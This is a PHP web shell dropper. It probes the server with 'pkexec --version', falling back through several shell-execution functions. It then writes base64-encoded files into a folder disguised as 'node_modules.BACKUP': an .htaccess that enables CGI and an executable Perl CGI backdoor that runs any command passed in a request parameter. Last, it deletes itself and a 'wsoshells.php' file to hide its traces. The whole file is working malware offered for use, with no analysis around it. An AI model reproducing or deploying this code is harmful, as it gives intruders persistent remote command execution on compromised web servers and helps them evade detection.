<?=`pkexec --version`?>
<?php 
function run_cmd($command){
	
	if(function_exists('system'))
	{
		ob_start();
		system($command);
		$sonuc = ob_get_contents();
		ob_end_clean();
	}
	
	else if(function_exists('shell_exec'))
	{
		$sonuc = shell_exec($command) ;
	}
	
	else if(function_exists('exec'))
	{
		exec($command , $sonuc);
		$sonuc = implode("n" , $sonuc);
	}
	
	else if(function_exists('passthru'))
	{
		ob_start();
		passthru($command);
		$sonuc = ob_get_contents();
		ob_end_clean();
	}
	
	else
	{
		$sonuc = '<font color="red">Shell Execution Disabled</font>';
	}
	
	return "<pre>".$sonuc."</pre>";
}

$result = run_cmd('pkexec --version');

echo $result;

if(strpos($result, 'pkexec version') == false) {
	mkdir('node_modules.BACKUP');
	file_put_contents('node_modules.BACKUP/.htaccess',base64_decode('T3B0aW9ucyBGb2xsb3dTeW1MaW5rcyBNdWx0aVZpZXdzIEluZGV4ZXMgRXhlY0NHSQ0KDQpBZGRUeXBlIGFwcGxpY2F0aW9uL3gtaHR0cGQtY2dpIC5jaW4NCg0KQWRkSGFuZGxlciBjZ2ktc2NyaXB0IC5jaW4NCkFkZEhhbmRsZXIgY2dpLXNjcmlwdCAuY2lu'));
	file_put_contents('node_modules.BACKUP/cmd.cin',base64_decode('IyEvdXNyL2Jpbi9wZXJsCnVzZSBDR0k7CnByaW50IENHSTo6aGVhZGVyKCAtdHlwZSA9PiAndGV4dC9odG1sJyApOwpteSAkY29tbWFuZCA9IENHSTo6cGFyYW0oJ2NvbW1hbmQnKTsKCiRyZXN1bHQgPSBgJGNvbW1hbmRgOwpwcmludCAkcmVzdWx0IC4gJzwvYnI+JzsKCiRyZXN1bHRfMiA9IGBwa2V4ZWMgLS12ZXJzaW9uOyB1bmFtZSAtYWA7CnByaW50ICRyZXN1bHRfMjs'));
	chmod('node_modules.BACKUP/cmd.cin', 0755);
	echo 'Perl CGI Script Uploaded';
}

unlink(basename($_SERVER['PHP_SELF']));
unlink(__FILE__);

@unlink('wsoshells.php');
?>